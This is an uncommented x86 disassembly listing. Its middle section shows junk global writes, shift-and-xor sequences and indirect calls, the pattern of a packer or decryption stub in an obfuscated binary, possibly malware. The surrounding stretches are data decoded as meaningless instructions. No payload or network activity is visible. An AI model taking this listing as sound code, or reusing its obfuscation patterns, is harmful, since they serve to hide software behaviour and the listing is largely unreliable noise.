  404bb6:	jns    0x404b3a
  404bb8:	pop    es
  404bb9:	out    0x3e,eax
  404bbb:	(bad)  
  404bbc:	jl     0x404c0b
  404bbe:	sub    ah,BYTE PTR [ebx+0x45]
  404bc1:	adc    al,0x6b
  404bc3:	call   0x67ad5316
  404bc8:	dec    esp
  404bc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bca:	sub    BYTE PTR [esi+0x4467b0f1],dl
  404bd0:	add    ebx,ebx
  404bd2:	xor    bl,BYTE PTR [ebp-0x27]
  404bd5:	pusha  
  404bd6:	add    ecx,DWORD PTR [eax+eax*2+0x52]
  404bda:	dec    ebx
  404bdb:	push   ebx
  404bdc:	adc    al,BYTE PTR [eax+0x32]
  404bdf:	and    esi,0x692419ff
  404be5:	addr16 xchg ebx,eax
  404be7:	push   edx
  404be8:	push   esi
  404be9:	jg     0x404c09
  404beb:	cwde   
  404bec:	jb     0x404c02
  404bee:	stos   DWORD PTR es:[edi],eax
  404bef:	fsubr  DWORD PTR [edx]
  404bf1:	xchg   edx,eax
  404bf2:	xlat   BYTE PTR ds:[ebx]
  404bf3:	cld    
  404bf4:	aam    0x0
  404bf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bf7:	aaa    
  404bf8:	sbb    al,0x2
  404bfa:	je     0x404bf6
  404bfc:	(bad)  
  404bfd:	fsub   DWORD PTR [esp+ebp*4]
  404c00:	inc    ecx
  404c01:	out    0xd8,eax
  404c03:	mov    ecx,DWORD PTR [ebx+0x48ed6166]
  404c09:	or     esp,ebx
  404c0b:	mov    eax,0xd15c203c
  404c10:	or     DWORD PTR [edi-0xb],0x50
  404c14:	jecxz  0x404c8f
  404c16:	std    
  404c17:	xchg   ecx,eax
  404c18:	out    0x6a,al
  404c1a:	fs mov ch,0x66
  404c1d:	dec    esi
  404c1e:	xor    DWORD PTR [eax],eax
  404c20:	mov    ds:0x227028a2,al
  404c25:	sbb    al,0xbf
  404c27:	or     ebx,DWORD PTR [eax-0x4847f947]
  404c2d:	out    dx,eax
  404c2e:	mov    esp,0xb9c9dc89
  404c33:	adc    eax,0xef432a68
  404c38:	stos   DWORD PTR es:[edi],eax
  404c39:	add    eax,0xfc511ff9
  404c3e:	rol    bl,0xf9
  404c41:	mov    esp,0xbd682d4b
  404c46:	sbb    BYTE PTR [eax+0x2b55382e],bl
  404c4c:	js     0x404cbf
  404c4e:	int    0x3a
  404c50:	inc    esi
  404c51:	and    DWORD PTR [edi+eax*8],ebp
  404c54:	mov    al,ds:0x43c1e6b2
  404c59:	dec    edi
  404c5a:	aad    0x9b
  404c5c:	mov    esp,DWORD PTR [ecx-0x36]
  404c5f:	mov    bh,0xac
  404c61:	or     al,0xb4
  404c63:	mov    ebx,0xe7fd3e84
  404c68:	out    0x31,eax
  404c6a:	adc    bh,dh
  404c6c:	loop   0x404c85
  404c6e:	cmp    eax,0xdb6fabae
  404c73:	in     eax,dx
  404c74:	lahf   
  404c75:	jno    0x404cd1
  404c77:	ss mov esp,0x8029000e
  404c7d:	leave  
  404c7e:	sbb    BYTE PTR [eax+0x4ac8139],0x29
  404c85:	pushf  
  404c86:	and    al,0xb4
  404c88:	xchg   esi,eax
  404c89:	cmp    eax,0x91fc6919
  404c8e:	nop
  404c8f:	(bad)  
  404c90:	out    0x98,eax
  404c92:	pop    ebp
  404c93:	int    0x84
  404c95:	fldcw  WORD PTR [edi-0x61d94c7f]
  404c9b:	cmc    
  404c9c:	pushf  
  404c9d:	xor    al,0x60
  404c9f:	shl    DWORD PTR [ebp-0x2c],1
  404ca2:	or     BYTE PTR [ebx+eiz*8],bl
  404ca5:	pop    ebp
  404ca6:	push   cs
  404ca7:	addr16 pushf 
  404ca9:	cmp    BYTE PTR [ebp+0x2f3d547e],dl
  404caf:	out    0x1f,eax
  404cb1:	mov    ebx,0x9111f7a4
  404cb6:	nop
  404cb7:	les    ecx,FWORD PTR [edi-0x3b3b865f]
  404cbd:	cmp    bl,ch
  404cbf:	aaa    
  404cc0:	xchg   ebx,eax
  404cc1:	push   0x48f1f9c3
  404cc6:	push   ss
  404cc7:	sbb    bl,BYTE PTR [ebx]
  404cc9:	mov    ecx,0x3d6bbb2f
  404cce:	sub    eax,0x66e809ce
  404cd3:	add    eax,0xf4c95308
  404cd8:	xchg   edi,eax
  404cd9:	into   
  404cda:	ror    BYTE PTR [edx],0x41
  404cdd:	mov    ebp,0x80b5c4a
  404ce2:	add    edx,DWORD PTR [eax]
  404ce4:	call   0x548fc687
  404ce9:	xchg   BYTE PTR [esp+esi*8],dl
  404cec:	popf   
  404ced:	sar    DWORD PTR ds:[ebx],0x70
  404cf1:	jg     0x404cfd
  404cf3:	sbb    bl,ah
  404cf5:	call   0xd774:0x87f40875
  404cfc:	lahf   
  404cfd:	mov    BYTE PTR [ebx-0x4afa4595],ah
  404d03:	js     0x404ce4
  404d05:	inc    esi
  404d06:	mov    WORD PTR [ecx-0x46aa0a03],ss
  404d0c:	sar    DWORD PTR [ebp-0x2caeee98],cl
  404d12:	std    
  404d13:	push   0x9649315e
  404d18:	and    bh,BYTE PTR [ebx+0x3a]
  404d1b:	dec    ebp
  404d1c:	mov    ebx,0xccf3003d
  404d21:	mov    ds:0xb3f5f1a8,al
  404d26:	ds jo  0x404cdb
  404d29:	aam    0xa3
  404d2b:	das    
  404d2c:	les    ebx,FWORD PTR [edx]
  404d2e:	jns    0x404cb1
  404d30:	add    BYTE PTR [esi-0x682e96b3],bh
  404d36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d37:	xchg   DWORD PTR [eax-0x41],ebx
  404d3a:	pop    ebp
  404d3b:	(bad)  
  404d3c:	cli    
  404d3d:	(bad)  
  404d3e:	fdivr  st(2),st
  404d40:	ss inc ecx
  404d42:	int    0xd8
  404d44:	xlat   BYTE PTR ds:[ebx]
  404d45:	mov    dl,BYTE PTR [ebp+0x45]
  404d48:	sbb    edi,DWORD PTR es:[eax]
  404d4b:	jmp    0xc57f8461
  404d50:	sahf   
  404d51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d52:	ret    0xed83
  404d55:	hlt    
  404d56:	leave  
  404d57:	lahf   
  404d58:	sbb    eax,0xffffffc0
  404d5b:	xor    BYTE PTR [ebp+ebp*8-0x19],dh
  404d5f:	or     BYTE PTR [edi+0x28],0x1e
  404d63:	ja     0x404d3b
  404d65:	(bad)  
  404d66:	scas   eax,DWORD PTR es:[edi]
  404d67:	sbb    eax,0xae60a6d
  404d6c:	cmp    DWORD PTR ds:0xf0df0023,esp
  404d72:	dec    edi
  404d73:	mov    edx,0xcd5fd598
  404d78:	xchg   ebx,eax
  404d79:	xchg   esi,eax
  404d7a:	pop    ebp
  404d7b:	jo     0x404d45
  404d7d:	mov    esp,0x27053106
  404d82:	adc    eax,0x6af8a8ac
  404d87:	xchg   ebp,eax
  404d88:	jns    0x404dec
  404d8a:	add    DWORD PTR [edx-0x69],0x18151599
  404d91:	sbb    edi,DWORD PTR [ebx+0x74cf39cb]
  404d97:	in     al,0xa3
  404d99:	not    eax
  404d9b:	xor    eax,DWORD PTR [ebp+0xd6af7c8]
  404da1:	or     ebp,edx
  404da3:	sbb    eax,0x442b212a
  404da8:	mov    ds:0x6467a15a,al
  404dad:	push   0x4a
  404daf:	int3   
  404db0:	dec    ebx
  404db1:	in     al,0xb5
  404db3:	inc    ebp
  404db4:	lds    ebx,FWORD PTR [ebx+0x504647ed]
  404dba:	mov    dh,0x96
  404dbc:	fild   DWORD PTR [ebp+0x79]
  404dbf:	or     eax,0x6383df58
  404dc4:	jno    0x404d85
  404dc6:	in     eax,dx
  404dc7:	push   DWORD PTR [edx-0x11]
  404dca:	jmp    DWORD PTR [eax-0x3]
  404dcd:	test   al,0xfc
  404dcf:	inc    ebp
  404dd0:	mov    eax,DWORD PTR [ebp+eax*4+0x74fda000]
  404dd7:	aad    0x89
  404dd9:	add    ch,ah
  404ddb:	lea    eax,[ebp+0x2088b996]
  404de1:	adc    ebp,edx
  404de3:	mov    fs,WORD PTR [ebp-0x429b1696]
  404de9:	lods   eax,DWORD PTR ds:[esi]
  404dea:	push   esp
  404deb:	aam    0xe3
  404ded:	dec    ebx
  404dee:	ret    0x3b50
  404df1:	xchg   esp,eax
  404df2:	cli    
  404df3:	loop   0x404e62
  404df5:	mov    ds:0xd79ea77d,al
  404dfa:	ret    0xb658
  404dfd:	in     al,dx
  404dfe:	jno    0x404e37
  404e00:	sub    edi,DWORD PTR [ebx-0x2d]
  404e03:	jmp    0x404dc6
  404e05:	cdq    
  404e06:	inc    esp
  404e07:	das    
  404e08:	mov    ds:0xde23c554,eax
  404e0d:	shr    BYTE PTR [edx+0x32a25e01],0xff
  404e14:	pushf  
  404e15:	frstor [ebx+0x12]
  404e18:	mov    bh,0x2d
  404e1a:	cmc    
  404e1b:	adc    BYTE PTR [edi-0x29],ah
  404e1e:	jns    0x404e7c
  404e20:	dec    esi
  404e21:	out    0x52,eax
  404e23:	fisttp WORD PTR [esi]
  404e25:	pop    esp
  404e26:	mov    ?,WORD PTR [ecx+0x56317b6d]
  404e2c:	pop    ebp
  404e2d:	and    al,0x87
  404e2f:	jecxz  0x404dbb
  404e31:	repnz pop esp
  404e33:	cmovns esi,DWORD PTR [eax-0x67583308]
  404e3a:	lock lods al,BYTE PTR ds:[esi]
  404e3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e3d:	in     al,0xe3
  404e3f:	pop    esi
  404e40:	stos   BYTE PTR es:[edi],al
  404e41:	loopne 0x404ead
  404e43:	lahf   
  404e44:	icebp  
  404e45:	xchg   ebx,eax
  404e46:	lds    ebp,FWORD PTR [eax+0x14e90ecd]
  404e4c:	call   0x6c47:0x4c2ef362
  404e53:	shl    DWORD PTR [ebx],cl
  404e55:	imul   edx,DWORD PTR [esi-0x66],0xc
  404e59:	add    BYTE PTR [esi-0x15a0359b],0x9b
  404e60:	cwde   
  404e61:	pop    ebp
  404e62:	dec    edi
  404e63:	mov    ah,0x9d
  404e65:	loopne 0x404e86
  404e67:	mov    dl,0xc5
  404e69:	std    
  404e6a:	or     al,0x77
  404e6c:	jp     0x404eea
  404e6e:	mov    esp,0x7888ac21
  404e73:	scas   al,BYTE PTR es:[edi]
  404e74:	sub    eax,0xed0c6e3
  404e79:	jns    0x404e9f
  404e7b:	pop    ecx
  404e7c:	add    BYTE PTR [ebp+ebx*2-0x5e],dh
  404e80:	and    eax,0x6eb54d77
  404e85:	push   ss
  404e86:	mov    ebp,0xec7d5391
  404e8b:	sbb    DWORD PTR [esi-0x75],edx
  404e8e:	xchg   edx,eax
  404e8f:	push   eax
  404e90:	pop    ebx
  404e91:	push   esp
  404e92:	xchg   esp,eax
  404e93:	rcr    bl,0x4b
  404e96:	adc    ebx,DWORD PTR [eax]
  404e98:	xchg   esi,eax
  404e99:	lea    ebp,[edx]
  404e9b:	or     eax,0x4eded852
  404ea0:	imul   edi,esp,0xfffffff5
  404ea3:	push   edi
  404ea4:	sbb    BYTE PTR [edi+ebp*4],al
  404ea7:	push   ebp
  404ea8:	push   edx
  404ea9:	or     ebx,DWORD PTR [ebx]
  404eab:	pushf  
  404eac:	jg     0x404f13
  404eae:	jo     0x404e3d
  404eb0:	jmp    0xdac2:0xae79d1be
  404eb7:	icebp  
  404eb8:	push   cs
  404eb9:	(bad)  
  404eba:	or     ebx,DWORD PTR [ebx-0x4b]
  404ebd:	lea    ebx,[edi+0x6037d9b0]
  404ec3:	or     DWORD PTR [eax+0x63],ebx
  404ec6:	and    al,0xec
  404ec8:	mov    ch,0x5f
  404eca:	inc    BYTE PTR [esi]
  404ecc:	mov    bl,0x47
  404ece:	jle    0x404e5b
  404ed0:	(bad)  
  404ed2:	push   0xc6b247ce
  404ed7:	rcr    BYTE PTR [esi],cl
  404ed9:	(bad)  
  404eda:	nop
  404edb:	(bad)  
  404edd:	retf   
  404ede:	inc    eax
  404edf:	push   ss
  404ee0:	(bad)  
  404ee1:	and    BYTE PTR [edi-0x4ef9def4],bl
  404ee7:	imul   edx,ecx,0xffffffcb
  404eea:	mov    dh,0x14
  404eec:	inc    esp
  404eed:	push   cs
  404eee:	and    bl,BYTE PTR [esi-0x6d]
  404ef1:	jb     0x404ec0
  404ef3:	add    ecx,DWORD PTR [edx]
  404ef5:	jae    0x404ef8
  404ef7:	imul   edx
  404ef9:	inc    edi
  404efa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404efb:	inc    esi
  404efc:	cld    
  404efd:	(bad)  
  404efe:	in     al,0x31
  404f00:	nop
  404f01:	push   edx
  404f02:	add    ch,BYTE PTR [ebx+0x2e594e7c]
  404f08:	(bad)  
  404f09:	paddd  mm4,mm2
  404f0c:	jl     0x404f68
  404f0e:	xchg   edi,eax
  404f0f:	iret   
  404f10:	cmp    ah,ah
  404f12:	lds    eax,FWORD PTR [si-0x74e7]
  404f17:	mov    ecx,0x22f96208
  404f1c:	cmp    ecx,DWORD PTR [edi+0x3c]
  404f1f:	retf   0x88c1
  404f22:	jmp    0x1d0b:0x7d7d7611
  404f29:	push   ecx
  404f2a:	mov    edi,0xe4550b85
  404f2f:	sbb    DWORD PTR ds:0x42823b,0x7456
  404f39:	shl    ecx,0x1e
  404f3c:	lea    ecx,[edx+eax*1]
  404f3f:	adc    edx,DWORD PTR ds:0x428247
  404f45:	mov    eax,DWORD PTR [ebx]
  404f47:	or     DWORD PTR ds:0x42835b,edi
  404f4d:	mov    edx,DWORD PTR [ebx+0x4]
  404f50:	mov    DWORD PTR ds:0x428337,0x1480
  404f5a:	shrd   eax,edx,0x2
  404f5e:	adc    DWORD PTR ds:0x428343,0x1a3a
  404f68:	shr    edx,0x2
  404f6b:	cmp    DWORD PTR ds:0x428343,0x0
  404f72:	mov    DWORD PTR ds:0x4282d3,ebx
  404f78:	mov    DWORD PTR ds:0x42834b,0x56b3
  404f82:	mov    DWORD PTR ds:0x42822b,0x1c7d
  404f8c:	jmp    0x405004
  404f91:	mov    DWORD PTR ds:0x4281ff,ebx
  404f97:	mov    DWORD PTR ds:0x428237,0x5683
  404fa1:	cmp    DWORD PTR ds:0x428343,0x0
  404fa8:	jg     0x404fd2
  404fae:	push   0x428f
  404fb3:	push   DWORD PTR [ebp-0x14]
  404fb6:	call   DWORD PTR ds:0x428d4c
  404fbc:	and    edx,DWORD PTR ds:0x4282e3
  404fc2:	sub    DWORD PTR ds:0x42820f,ecx
  404fc8:	or     DWORD PTR ds:0x428203,0xf0b
  404fd2:	adc    DWORD PTR ds:0x42813f,0x4903
  404fdc:	mov    edx,DWORD PTR ds:0x428323
  404fe2:	mov    edx,DWORD PTR [edx]
  404fe4:	add    DWORD PTR ds:0x42812b,edx
  404fea:	xor    edx,edx
  404fec:	xor    edx,DWORD PTR ds:0x428123
  404ff2:	xor    DWORD PTR ds:0x428263,edx
  404ff8:	mov    edx,DWORD PTR ds:0x428237
  404ffe:	add    DWORD PTR ds:0x42835b,edx
  405004:	mov    DWORD PTR [ebp-0x1c],eax
  405007:	mov    eax,ds:0x428263
  40500c:	add    DWORD PTR ds:0x42823b,eax
  405012:	mov    eax,DWORD PTR [ebx]
  405014:	sub    edx,0x532
  40501a:	mov    edx,DWORD PTR [ebx+0x4]
  40501d:	xor    DWORD PTR [ebp-0x1c],edi
  405020:	mov    edx,eax
  405022:	xor    eax,eax
  405024:	add    DWORD PTR ds:0x428343,0x32cc
  40502e:	or     eax,DWORD PTR [ebp-0x1c]
  405031:	sub    DWORD PTR ds:0x42834f,0x1679
  40503b:	shl    edx,0x1e
  40503e:	and    DWORD PTR ds:0x428137,edi
  405044:	imul   eax,ecx
  405047:	mov    ecx,DWORD PTR [ebx]
  405049:	mov    edx,DWORD PTR [ebx+0x4]
  40504c:	shrd   ecx,edx,0x2
  405050:	sbb    DWORD PTR ds:0x42835f,0x5de1
  40505a:	mov    DWORD PTR [ebp-0x1c],ecx
  40505d:	sbb    DWORD PTR ds:0x42824f,0x3a7c
  405067:	mov    ecx,DWORD PTR [ebx]
  405069:	adc    DWORD PTR ds:0x428143,0x428227
  405073:	xor    DWORD PTR [ebp-0x1c],edi
  405076:	shr    edx,0x2
  405079:	adc    DWORD PTR ds:0x42833b,ecx
  40507f:	mov    edx,DWORD PTR [ebx+0x4]
  405082:	mov    edx,ecx
  405084:	xor    ecx,ecx
  405086:	mov    DWORD PTR ds:0x42834b,0x321a
  405090:	or     ecx,DWORD PTR [ebp-0x1c]
  405093:	adc    DWORD PTR ds:0x42823b,0x428347
  40509d:	shl    edx,0x1e
  4050a0:	or     DWORD PTR ds:0x428233,0x428253
  4050aa:	sub    ecx,eax
  4050ac:	mov    eax,DWORD PTR [ebp-0xc]
  4050af:	mov    DWORD PTR ds:0x428207,0x7aa6
  4050b9:	cmp    DWORD PTR [eax],ecx
  4050bb:	not    eax
  4050bd:	mov    eax,DWORD PTR [ebp-0xc]
  4050c0:	mov    DWORD PTR ds:0x42833b,0x460d
  4050ca:	jg     0x405287
  4050d0:	mov    ecx,DWORD PTR [ebp+0x18]
  4050d3:	xor    DWORD PTR ds:0x42834b,edx
  4050d9:	mov    edx,DWORD PTR [ebp+0x1c]
  4050dc:	sbb    DWORD PTR ds:0x428357,0x4281fb
  4050e6:	shrd   ecx,edx,0x2
  4050ea:	sbb    DWORD PTR ds:0x428223,0x42820f
  4050f4:	mov    DWORD PTR [ebp-0x1c],ecx
  4050f7:	mov    ecx,DWORD PTR [ebp+0x18]
  4050fa:	xor    DWORD PTR [ebp-0x1c],edi
  4050fd:	or     DWORD PTR ds:0x42825f,0x2ce0
  405107:	shl    ecx,0x1e
  40510a:	xor    ecx,ecx
  40510c:	and    DWORD PTR ds:0x42823f,0x42821b
  405116:	or     ecx,DWORD PTR [ebp-0x1c]
  405119:	shr    edx,0x2
  40511c:	or     DWORD PTR ds:0x428127,ebx
  405122:	mov    edx,DWORD PTR [ebp+0x1c]
  405125:	mov    DWORD PTR [ebp-0x2c],ecx
  405128:	cmp    DWORD PTR ds:0x42834b,0x0
  40512f:	mov    DWORD PTR ds:0x42815b,edx
  405135:	mov    DWORD PTR ds:0x42832b,ecx
  40513b:	not    edx
  40513d:	jmp    0x405212
  405142:	mov    DWORD PTR ds:0x42813b,0x795c
  40514c:	cmp    DWORD PTR ds:0x42834b,0x0
  405153:	ja     0x40517c
  405159:	push   0x427f6c
  40515e:	push   DWORD PTR [ebp-0x24]
  405161:	push   0x6923
  405166:	call   DWORD PTR ds:0x428d74
  40516c:	or     DWORD PTR ds:0x428233,0xa87
  405176:	add    ecx,DWORD PTR ds:0x428367
  40517c:	adc    ecx,DWORD PTR ds:0x42814b
  405182:	xor    DWORD PTR ds:0x42813b,0x1a4f
  40518c:	sbb    DWORD PTR ds:0x42824f,edx
  405192:	cmp    DWORD PTR ds:0x4282ab,0x0
  405199:	mov    DWORD PTR ds:0x4282d7,0x66a6
  4051a3:	mov    DWORD PTR ds:0x4282b7,ecx
  4051a9:	mov    ecx,0x67a4
  4051ae:	jmp    0x405212
  4051b3:	mov    edx,0x2152
  4051b8:	cmp    DWORD PTR ds:0x4282ab,0x0
  4051bf:	jge    0x4051e9
  4051c5:	push   DWORD PTR [ebp-0x28]
  4051c8:	push   DWORD PTR [ebp-0x28]
  4051cb:	call   DWORD PTR ds:0x428d78
  4051d1:	inc    DWORD PTR ds:0x428247
  4051d7:	mov    ecx,DWORD PTR ds:0x428187
  4051dd:	mov    edx,DWORD PTR ds:0x428387
  4051e3:	sub    ecx,edx
  4051e5:	imul   ecx,DWORD PTR [ecx+edx*1]
  4051e9:	xor    DWORD PTR ds:0x4282ab,0x4a74
  4051f3:	mov    edx,DWORD PTR ds:0x42817f
  4051f9:	mov    edx,DWORD PTR [edx]
  4051fb:	sub    DWORD PTR ds:0x428233,edx
  405201:	mov    edx,DWORD PTR ds:0x428197
  405207:	mov    ecx,DWORD PTR ds:0x428387
  40520d:	sub    ecx,edx
  40520f:	and    edx,DWORD PTR [edx+ecx*1]
  405212:	mov    ecx,DWORD PTR [ebx]
  405214:	sub    DWORD PTR ds:0x42833f,0x2089
  40521e:	mov    edx,DWORD PTR [ebx+0x4]
  405221:	shrd   ecx,edx,0x2
  405225:	shr    edx,0x2
  405228:	mov    DWORD PTR [ebp-0x1c],ecx
  40522b:	xor    edx,edx
  40522d:	xor    edx,DWORD PTR ds:0x42824f
  405233:	sub    DWORD PTR ds:0x428153,edx
  405239:	mov    ecx,DWORD PTR [ebx]
  40523b:	inc    edx
  40523c:	mov    edx,DWORD PTR [ebx+0x4]
  40523f:	add    DWORD PTR ds:0x42832b,0x35fe
  405249:	xor    DWORD PTR [ebp-0x1c],edi
  40524c:	xor    edx,edx
  40524e:	xor    DWORD PTR ds:0x428137,0x631d
  405258:	or     edx,DWORD PTR [ebp-0x1c]
  40525b:	xor    DWORD PTR ds:0x42823f,0x428143
  405265:	shl    ecx,0x1e
  405268:	and    DWORD PTR ds:0x42835b,0x428227
  405272:	imul   edx,DWORD PTR [ebp-0x2c]
  405276:	add    DWORD PTR ds:0x428353,0x4996
  405280:	sub    DWORD PTR [eax],edx
  405282:	jmp    0x4058d5
  405287:	add    DWORD PTR ds:0x42812b,0x42f2
  405291:	mov    ecx,DWORD PTR [esi]
  405293:	cmp    DWORD PTR ds:0x428263,0x0
  40529a:	mov    DWORD PTR ds:0x4281f3,0x7c0
  4052a4:	mov    edx,DWORD PTR ds:0x428233
  4052aa:	mov    DWORD PTR ds:0x4282bb,0x4c43
  4052b4:	jmp    0x405321
  4052b9:	mov    DWORD PTR ds:0x428363,0x6b40
  4052c3:	mov    DWORD PTR ds:0x42824b,0x2bfd
  4052cd:	cmp    DWORD PTR ds:0x428263,0x0
  4052d4:	jae    0x4052fc
  4052da:	push   0x428029
  4052df:	push   0x1ca9
  4052e4:	call   DWORD PTR ds:0x428d7c
  4052ea:	add    edx,DWORD PTR ds:0x42821b
  4052f0:	adc    edx,0x1702
  4052f6:	add    edx,DWORD PTR ds:0x428143
  4052fc:	and    DWORD PTR ds:0x42814f,0x3bee
  405306:	dec    edx
  405307:	xor    edx,edx
  405309:	or     edx,DWORD PTR ds:0x428227
  40530f:	add    DWORD PTR ds:0x428263,edx
  405315:	mov    edx,DWORD PTR ds:0x42824b
  40531b:	add    DWORD PTR ds:0x428133,edx
  405321:	mov    edx,DWORD PTR [esi+0x4]
  405324:	xor    DWORD PTR ds:0x4282b7,0x4281ef
  40532e:	shrd   ecx,edx,0x2
  405332:	mov    DWORD PTR [ebp-0x1c],ecx
  405335:	cmp    DWORD PTR ds:0x4282d3,0x0
  40533c:	mov    DWORD PTR ds:0x4282cf,edi
  405342:	mov    DWORD PTR ds:0x428237,ebx
  405348:	jmp    0x405426
  40534d:	mov    DWORD PTR ds:0x4282db,0x4d36
  405357:	mov    DWORD PTR ds:0x428357,0x1e95
  405361:	cmp    DWORD PTR ds:0x4282d3,0x0
  405368:	jb     0x405396
  40536e:	push   0x848f
  405373:	push   0x5d21
  405378:	call   DWORD PTR ds:0x428d80
  40537e:	not    ecx
  405380:	adc    DWORD PTR ds:0x42835f,ecx
  405386:	neg    ecx
  405388:	mov    ecx,DWORD PTR ds:0x42839f
  40538e:	mov    ecx,DWORD PTR [ecx]
  405390:	sub    DWORD PTR ds:0x42833f,ecx
  405396:	mov    ecx,DWORD PTR ds:0x42820f
  40539c:	xor    DWORD PTR ds:0x42811b,ecx
  4053a2:	or     ecx,0x48b0
  4053a8:	sbb    DWORD PTR ds:0x42823b,edx
  4053ae:	cmp    DWORD PTR ds:0x4282bb,0x0
  4053b5:	mov    DWORD PTR ds:0x428127,edi
  4053bb:	not    DWORD PTR ds:0x4281fb
  4053c1:	jmp    0x405426
  4053c6:	mov    DWORD PTR ds:0x428157,0xab0
  4053d0:	cmp    DWORD PTR ds:0x4282bb,0x0
  4053d7:	jb     0x405406
  4053dd:	push   0x56df
  4053e2:	push   DWORD PTR [ebp-0x20]
  4053e5:	push   DWORD PTR [ebp-0x20]
  4053e8:	push   0x14ed
  4053ed:	push   DWORD PTR [ebp-0x24]
  4053f0:	call   DWORD PTR ds:0x428d84
  4053f6:	sub    ecx,DWORD PTR ds:0x42815b
  4053fc:	sub    DWORD PTR ds:0x4281fb,0x6432
  405406:	or     DWORD PTR ds:0x42821f,0x3285
  405410:	adc    ecx,DWORD PTR ds:0x42814f
  405416:	sub    DWORD PTR ds:0x428353,edi
  40541c:	mov    DWORD PTR ds:0x4281fb,0x48f2
  405426:	mov    ecx,DWORD PTR [esi]
  405428:	xor    DWORD PTR [ebp-0x1c],edi
  40542b:	shl    ecx,0x1e
  40542e:	adc    DWORD PTR ds:0x428237,0xf0c
  405438:	xor    ecx,ecx
  40543a:	xor    DWORD PTR ds:0x4282af,0x1337
  405444:	or     ecx,DWORD PTR [ebp-0x1c]
  405447:	shr    edx,0x2
  40544a:	mov    edx,DWORD PTR ds:0x42835f
  405450:	sub    edx,DWORD PTR ds:0x428113
  405456:	mov    DWORD PTR ds:0x42835f,edx
  40545c:	jmp    0x40583a
  405461:	xchg   ecx,eax
  405462:	stc    
  405463:	xchg   ebp,eax
  405464:	out    dx,al
  405465:	ins    BYTE PTR es:[edi],dx
  405466:	push   0x6b
  405468:	jbe    0x405493
  40546a:	push   0x25
  40546c:	stos   BYTE PTR es:[edi],al
  40546d:	mov    edi,0xe67e4f88
  405472:	mov    ecx,0x129e1818
  405477:	sbb    BYTE PTR [eax],bl
  405479:	out    0x9c,eax
  40547b:	div    edi
  40547d:	mov    edx,0x34eafa7b
  405482:	(bad)  
  405483:	(bad)
  405488:	adc    BYTE PTR [edx],cl
  40548a:	jmp    0x405494
  40548c:	add    eax,0xece988e6
  405491:	fsubr  DWORD PTR [edx]
  405493:	xchg   ebp,eax
  405494:	jg     0x4054e8
  405496:	mov    ebp,0x5c03d31b
  40549b:	inc    eax
  40549c:	mov    edx,0x996aa8cd
  4054a1:	repnz sub ebp,DWORD PTR [edi-0x595ac15e]
  4054a8:	push   cs
  4054a9:	mov    dh,0xbd
  4054ab:	das    
  4054ac:	mov    eax,ds:0xc61bf3d6
  4054b1:	aaa    
  4054b2:	lods   al,BYTE PTR ds:[esi]
  4054b3:	mov    ecx,0x80d36ece
  4054b8:	cdq    
  4054b9:	stos   BYTE PTR es:[edi],al
  4054ba:	sub    esp,ebx
  4054bc:	sbb    DWORD PTR [eax-0x4b],ebp
  4054bf:	mov    DWORD PTR ds:[edi],ebx
  4054c2:	or     ebp,DWORD PTR [ecx+0x2aa5eb9d]
  4054c8:	or     eax,0x1f41192d
  4054cd:	mov    ah,0x9
  4054cf:	pop    ss
  4054d0:	pop    ss
  4054d1:	stos   BYTE PTR es:[edi],al
  4054d2:	call   0x43c7:0xcc6f6e47
  4054d9:	jno    0x405471
  4054db:	jb     0x405549
  4054dd:	dec    esi
  4054de:	sahf   
  4054df:	pop    ebp
  4054e0:	jp     0x4054f2
  4054e2:	mov    dl,0xe5
  4054e4:	fisttp WORD PTR [esi]
  4054e6:	lahf   
  4054e7:	add    cl,BYTE PTR [ecx-0x22481e7d]
  4054ed:	enter  0x64cc,0x74
  4054f1:	dec    esp
  4054f2:	add    edi,DWORD PTR [edx+0x3347acf7]
  4054f8:	aad    0x6b
  4054fa:	xor    eax,ecx
  4054fc:	cmp    dh,0x43
  4054ff:	repz clc 
  405501:	aam    0xa3
  405503:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405504:	cmp    DWORD PTR [esi-0x18],edi
  405507:	sbb    BYTE PTR [edx],ah
  405509:	or     ch,bl
  40550b:	(bad)  
  40550c:	sar    DWORD PTR [ebx],0x8d
  40550f:	scas   eax,DWORD PTR es:[edi]
  405510:	test   eax,0x14dee98d
  405515:	xchg   edi,eax
  405516:	std    
  405517:	daa    
  405518:	dec    ecx
  405519:	lahf   
  40551a:	cmp    BYTE PTR [ebp+0x2d],dh
  40551d:	test   BYTE PTR ds:0x632c10cb,dh
  405523:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405524:	or     eax,0x22e7ae90
  405529:	jns    0x40556e
  40552b:	idiv   BYTE PTR [ecx]
  40552d:	xor    al,0xf7
  40552f:	ds push 0x393f8617
  405535:	xor    BYTE PTR [esi],dl
  405537:	jecxz  0x40559b
  405539:	jno    0x40554d
  40553b:	and    ecx,DWORD PTR [esi-0x136d5052]
  405541:	in     eax,0x6d
  405543:	test   DWORD PTR [ebx*4+0x4f2f0545],ecx
  40554a:	adc    DWORD PTR [edx],esi
  40554c:	ret    
  40554d:	jmp    DWORD PTR [edx]
  40554f:	dec    esi
  405550:	pop    edx
  405551:	and    al,0x71
  405553:	add    BYTE PTR [esi-0x5],dl
  405556:	lods   eax,DWORD PTR ds:[esi]
  405557:	ins    DWORD PTR es:[edi],dx
  405558:	jne    0x40552c
  40555a:	retf   
  40555b:	stos   DWORD PTR es:[edi],eax
  40555c:	push   ebx
  40555d:	lea    ecx,ds:0xd25655fe
  405563:	ret    0xb0d0
  405566:	(bad)  
  405567:	enter  0xf901,0x3a
  40556b:	test   al,0xbb
  40556d:	call   0xdf2a:0xbb37a190
  405574:	fs or  al,0xe7
  405577:	sar    DWORD PTR [edi-0x7343eecc],0x84
  40557e:	adc    DWORD PTR [esi-0x6d],esi
  405581:	cld    
  405582:	add    ebx,DWORD PTR [ebx-0x3e]
  405585:	jle    0x4055a1
  405587:	push   esp
  405588:	inc    esi
  405589:	jl     0x4055bc
  40558b:	mov    bl,0x7f
  40558d:	fs jl  0x40554b
  405590:	daa    
  405591:	jno    0x40559c
  405593:	xchg   DWORD PTR [edi+0x45],edi
  405596:	cmp    al,0x3
  405598:	pushf  
  405599:	int    0xc
  40559b:	lds    ebp,FWORD PTR [eax+0x72]
